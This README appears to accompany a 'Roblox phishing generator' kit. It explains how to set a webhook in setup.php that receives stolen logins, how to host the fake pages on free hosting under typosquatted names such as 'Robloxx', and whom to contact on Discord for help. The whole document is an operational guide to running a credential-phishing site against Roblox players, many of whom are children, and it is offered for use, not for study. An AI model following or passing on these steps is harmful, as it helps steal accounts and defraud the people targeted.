# Free Roblox Phishing Generator 📌


# Tutorial 🌟

```

Go to setup.php

change webhook 

and everything else, save the setup.php and open Generator.php

If everything is done correctly ur generator should work!

```


# Setup Hosting for people who dont know

```

tutorial Hosting

1. Go to https://www.000webhost.com/ and create a account.

2. u should see, Hey there, {user}! now click on Lets create some magic, click Other after that it

should show Website Name.

Example: Robloxx, Robllox, Roobloxa 

Note: if u want a better domain buy one from godaddy.com or cosmotown

3. U should see a button saying upload your site, Click select!

4. Now open public_html, and upload the files + folders also dont remove or edit .htaccess.

5. Now go back to https://www.000webhost.com/members/website/list and click ur site link, Now type https://{UrSiteName}.000webhostapp.com/Generator.php

6. ur done u made ur generator!

Errors with setup contact Termed#0002

```

